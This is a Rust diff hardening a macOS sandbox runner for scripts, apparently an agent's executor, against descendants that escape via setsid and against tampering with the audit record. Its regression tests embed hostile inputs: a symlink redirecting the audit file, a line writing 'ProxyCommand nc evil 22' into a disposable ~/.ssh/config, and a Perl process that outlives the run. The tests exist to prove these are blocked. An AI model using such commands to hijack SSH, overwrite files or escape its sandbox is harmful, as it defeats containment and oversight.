@@ -16,7 +16,7 @@ use std::time::Duration;
 use anyhow::{anyhow, Context, Result};
 use tokio::io::AsyncReadExt;
 
-pub use profile::{is_denied_read, SandboxPolicy};
+pub use profile::{is_denied_read, is_protected_write, SandboxPolicy};
 
 /// Per-run resource ceilings, enforced via `setrlimit` in the child before it
 /// execs (plus a wall-clock timeout the parent enforces).
@@ -50,6 +50,11 @@ pub struct SandboxOutcome {
     pub stderr: String,
     /// True if the wall-clock timeout fired and we killed the process group.
     pub timed_out: bool,
+    /// True only when the post-run sweep found nothing of this run still
+    /// running. False means the runner asked the OS to stop the script and
+    /// could not confirm that it did (L-277) — the caller must report that
+    /// difference rather than calling the run finished.
+    pub cleanup_confirmed: bool,
 }
 
 impl SandboxOutcome {
@@ -152,7 +157,11 @@ pub async fn run(
     let real_scratch = tokio::fs::canonicalize(&policy.scratch_dir)
         .await
         .with_context(|| format!("resolving scratch dir {}", policy.scratch_dir.display()))?;
+    let real_run_dir = tokio::fs::canonicalize(&policy.run_dir)
+        .await
+        .with_context(|| format!("resolving run dir {}", policy.run_dir.display()))?;
     let policy = SandboxPolicy {
+        run_dir: real_run_dir,
         scratch_dir: real_scratch,
         writable_paths: policy.writable_paths.clone(),
         readable_paths: policy.readable_paths.clone(),
@@ -161,7 +170,9 @@ pub async fn run(
 
     let profile_text =
         profile::build_profile_with_runtime_roots(&policy, home, &resolved_xcode_runtime_roots());
-    let profile_path: PathBuf = policy.scratch_dir.join("sandbox.sb");
+    // Beside the script in the run dir, not in the scratch the script can
+    // write: the profile is part of the audit record of what was allowed.
+    let profile_path: PathBuf = policy.run_dir.join("sandbox.sb");
     tokio::fs::write(&profile_path, &profile_text)
         .await
         .context("writing sandbox profile")?;
@@ -214,7 +225,10 @@ pub async fn run(
         .id()
         .ok_or_else(|| anyhow!("sandboxed child has no pid"))? as i32;
 
-    let group = ProcessGroup(pid);
+    let group = ProcessGroup {
+        pgid: pid,
+        run_dir: policy.run_dir.clone(),
+    };
     let mut stdout_pipe = child.stdout.take().expect("piped");
     let mut stderr_pipe = child.stderr.take().expect("piped");
     let out_task = tokio::spawn(async move { read_capped(&mut stdout_pipe).await });
@@ -236,6 +250,9 @@ pub async fn run(
     // A child can exit while its descendants retain the pipes. Retire those
     // descendants before waiting for EOF, including on normal completion.
     drop(group);
+    // `drop` above already killed the group and swept once; ask again so the
+    // answer we report is the state after that sweep, not before it.
+    let cleanup_confirmed = sweep_run(&policy.run_dir);
     let stdout = out_task.await.unwrap_or_default();
     let stderr = err_task.await.unwrap_or_default();
 
@@ -244,18 +261,107 @@ pub async fn run(
         stdout,
         stderr,
         timed_out,
+        cleanup_confirmed,
     })
+}
+
+// ── descendant cleanup (L-277) ───────────────────────────────────────────
+//
+// `killpg` retires the process group this runner created. It does not retire a
+// descendant that called `setsid()`: that process leaves the group, is
+// reparented away, and keeps running. Reproduced under this exact profile — a
+// disposable Perl child called `setsid`, closed its output handles, outlived
+// the kill of its parent group by two seconds, and then wrote a file. The
+// script's execution lease had been released; the OS process had not stopped.
+//
+// macOS gives an unprivileged process no job object, no cgroup and no
+// process-tree kill, so descendant containment cannot be *asserted* here. It
+// can be *checked*, and the honest thing is to check and then say what the
+// check found. `pgrep -f` over the run directory catches a survivor whose
+// command line still names this run — the realistic case, since the escapee is
+// the interpreter still running the script. A survivor that re-execs something
+// naming nothing of ours is not caught, which is exactly why this reports a
+// boolean instead of pretending to be containment.
+
+/// Kill anything still running that names `run_dir`, bounded. Returns true
+/// only if nothing was left. Best-effort by construction — see above.
+fn sweep_run(run_dir: &Path) -> bool {
+    for attempt in 0..4 {
+        let alive = processes_naming(run_dir);
+        if alive.is_empty() {
+            return true;
+        }
+        for pid in alive {
+            #[cfg(unix)]
+            unsafe {
+                libc::kill(pid, libc::SIGKILL);
+            }
+        }
+        if attempt < 3 {
+            std::thread::sleep(Duration::from_millis(50));
+        }
+    }
+    processes_naming(run_dir).is_empty()
+}
+
+/// PIDs whose command line mentions `run_dir`, excluding this process.
+fn processes_naming(run_dir: &Path) -> Vec<i32> {
+    // Match the run directory's own name, not its full path.
+    //
+    // The full path looked obviously right and was wrong: the runner
+    // canonicalizes the policy's paths (`/var/folders/…` becomes
+    // `/private/var/folders/…`) while the interpreter's argv still holds
+    // whatever the caller passed. Two spellings of one directory, and a sweep
+    // searching for the wrong one reports "nothing survived" about a process
+    // that is still running — the exact false clean the L-277 regression test
+    // caught. The final component is identical in both spellings, unique per
+    // run, and anchored with a leading slash so it cannot match loose text.
+    //
+    // `pgrep -f` takes an extended regular expression, so the component is
+    // escaped: a stray `+` or `(` would otherwise change what is matched.
+    let name = run_dir
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_else(|| run_dir.to_string_lossy().into_owned());
+    let mut pattern = String::from("/");
+    for ch in name.chars() {
+        if "\\.^$|()[]{}*+?/".contains(ch) {
+            pattern.push('\\');
+        }
+        pattern.push(ch);
+    }
+    let Ok(out) = std::process::Command::new("/usr/bin/pgrep")
+        .arg("-f")
+        .arg(&pattern)
+        .stderr(Stdio::null())
+        .output()
+    else {
+        return Vec::new();
+    };
+    let me = std::process::id() as i32;
+    String::from_utf8_lossy(&out.stdout)
+        .split_whitespace()
+        .filter_map(|s| s.parse::<i32>().ok())
+        .filter(|pid| *pid != me && *pid > 1)
+        .collect()
 }
 
 /// Cancellation drops the future before its timeout branch can run. The
 /// process group must therefore be owned by a drop guard, not only that branch.
-struct ProcessGroup(i32);
+struct ProcessGroup {
+    pgid: i32,
+    run_dir: PathBuf,
+}
 impl Drop for ProcessGroup {
     fn drop(&mut self) {
         #[cfg(unix)]
         unsafe {
-            libc::killpg(self.0, libc::SIGKILL);
+            libc::killpg(self.pgid, libc::SIGKILL);
         }
+        // Cancellation drops this guard and then drops the rest of the future,
+        // so this is the only place a cancelled run gets swept at all. Bounded
+        // to ~150 ms of blocking; the alternative is leaving the escapee.
+        sweep_run(&self.run_dir);
     }
 }
 
@@ -325,7 +431,7 @@ mod tests {
         }
         let dir = scratch("write_ok");
         let policy = SandboxPolicy::read_only(dir.clone());
-        let target = dir.join("out.txt");
+        let target = policy.scratch_dir.join("out.txt");
         let outcome = run(
             &policy,
             &SandboxLimits::default(),
@@ -565,9 +671,9 @@ mod tests {
             return;
         }
         let dir = scratch("cancel_descendants");
-        let ready = dir.join("ready");
-        let escaped = dir.join("late-write");
         let policy = SandboxPolicy::read_only(dir.clone());
+        let ready = policy.scratch_dir.join("ready");
+        let escaped = policy.scratch_dir.join("late-write");
         let script = format!(
             "(sleep 1; echo escaped > '{}') & echo ready > '{}'; wait",
             escaped.display(),
@@ -673,5 +779,139 @@ mod tests {
 
         std::fs::remove_dir_all(dir).ok();
         std::fs::remove_dir_all(victim).ok();
+    }
+
+    /// L-260, reproduced before the fix: the script pointed the audit record's
+    /// name at a file outside its jail, and the executor's own unsandboxed
+    /// write followed the link and overwrote that file.
+    ///
+    /// Two halves, one claim: the script can no longer create the name, and
+    /// even if it somehow could, the host write refuses to follow it.
+    #[tokio::test]
+    async fn a_script_cannot_aim_the_audit_record_at_another_file() {
+        if !sandbox_available() {
+            return;
+        }
+        let dir = scratch("audit_redirect");
+        let victim_dir = scratch("audit_victim");
+        let victim = victim_dir.join("victim.txt");
+        std::fs::write(&victim, "ORIGINAL").unwrap();
+        let policy = SandboxPolicy::read_only(dir.clone());
+        let audit = policy.run_dir.join("output.txt");
+        let outcome = run(
+            &policy,
+            &SandboxLimits::default(),
+            "/bin/sh",
+            &[
+                "-c".into(),
+                format!("ln -s {} {}", victim.display(), audit.display()),
+            ],
+            Path::new("/tmp"),
+        )
+        .await
+        .unwrap();
+        assert!(
+            !outcome.succeeded(),
+            "the script created a name in the run dir"
+        );
+        assert!(!audit.exists(), "the run dir is writable again");
+
+        // And the host write is no longer follow-able even if the name exists:
+        // stage the link with full host authority and watch the write refuse.
+        std::os::unix::fs::symlink(&victim, &audit).unwrap();
+        assert!(
+            crate::agent::executor::sandbox_exec::write_new_no_follow(&audit, b"HOST RECORD")
+                .is_err(),
+            "the host write followed a symlink"
+        );
+        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "ORIGINAL");
+        std::fs::remove_dir_all(&dir).ok();
+        std::fs::remove_dir_all(&victim_dir).ok();
+    }
+
+    /// L-261, reproduced before the fix: a write-only grant on a disposable
+    /// `~/.ssh/config` let the script rewrite a file it could not even read.
+    /// The fixture is a disposable home, never the real one.
+    #[tokio::test]
+    async fn a_write_grant_cannot_reach_a_protected_file() {
+        if !sandbox_available() {
+            return;
+        }
+        let dir = scratch("protected_write");
+        let fake_home = scratch("protected_home");
+        let ssh = fake_home.join(".ssh");
+        std::fs::create_dir_all(&ssh).unwrap();
+        let config = ssh.join("config");
+        std::fs::write(&config, "Host github.com\n").unwrap();
+
+        let mut policy = SandboxPolicy::read_only(dir.clone());
+        policy.writable_paths = vec![config.clone()];
+        let outcome = run(
+            &policy,
+            &SandboxLimits::default(),
+            "/bin/sh",
+            &[
+                "-c".into(),
+                format!("printf 'ProxyCommand nc evil 22\n' > {}", config.display()),
+            ],
+            &fake_home,
+        )
+        .await
+        .unwrap();
+        assert!(!outcome.succeeded(), "a protected file was written");
+        assert_eq!(
+            std::fs::read_to_string(&config).unwrap(),
+            "Host github.com\n",
+            "the protected file changed"
+        );
+        assert!(is_protected_write(&config, &fake_home));
+        std::fs::remove_dir_all(&dir).ok();
+        std::fs::remove_dir_all(&fake_home).ok();
+    }
+
+    /// L-277, reproduced before the fix: a descendant that called `setsid`
+    /// left the process group, outlived `killpg`, and wrote a file two seconds
+    /// later. The sweep is not containment — macOS gives us none — so the
+    /// claim under test is narrower and honest: the escapee is found and
+    /// killed, and if it were not, the outcome would say so.
+    #[tokio::test]
+    async fn a_setsid_descendant_does_not_outlive_the_run() {
+        if !sandbox_available() || !Path::new("/usr/bin/perl").exists() {
+            return;
+        }
+        let dir = scratch("setsid_escape");
+        let policy = SandboxPolicy::read_only(dir.clone());
+        let marker = policy.scratch_dir.join("late-marker");
+        std::fs::create_dir_all(&policy.scratch_dir).unwrap();
+        let script = format!(
+            "use POSIX qw(setsid); \
+             my $p = fork(); \
+             if ($p == 0) {{ setsid(); close(STDOUT); close(STDERR); sleep 2; \
+               open(my $f, '>', '{}'); print $f 'ESCAPED'; close($f); exit 0; }} \
+             print \"spawned\n\";",
+            marker.display()
+        );
+        let outcome = run(
+            &policy,
+            &SandboxLimits {
+                wall_timeout: Duration::from_millis(400),
+                ..Default::default()
+            },
+            "/usr/bin/perl",
+            &["-e".into(), script],
+            Path::new("/tmp"),
+        )
+        .await
+        .unwrap();
+        assert!(
+            outcome.cleanup_confirmed,
+            "the sweep could not confirm the run had stopped"
+        );
+        tokio::time::sleep(Duration::from_millis(2500)).await;
+        assert!(
+            !marker.exists(),
+            "a descendant kept executing after the run ended"
+        );
+        std::fs::remove_dir_all(&dir).ok();
     }
 }
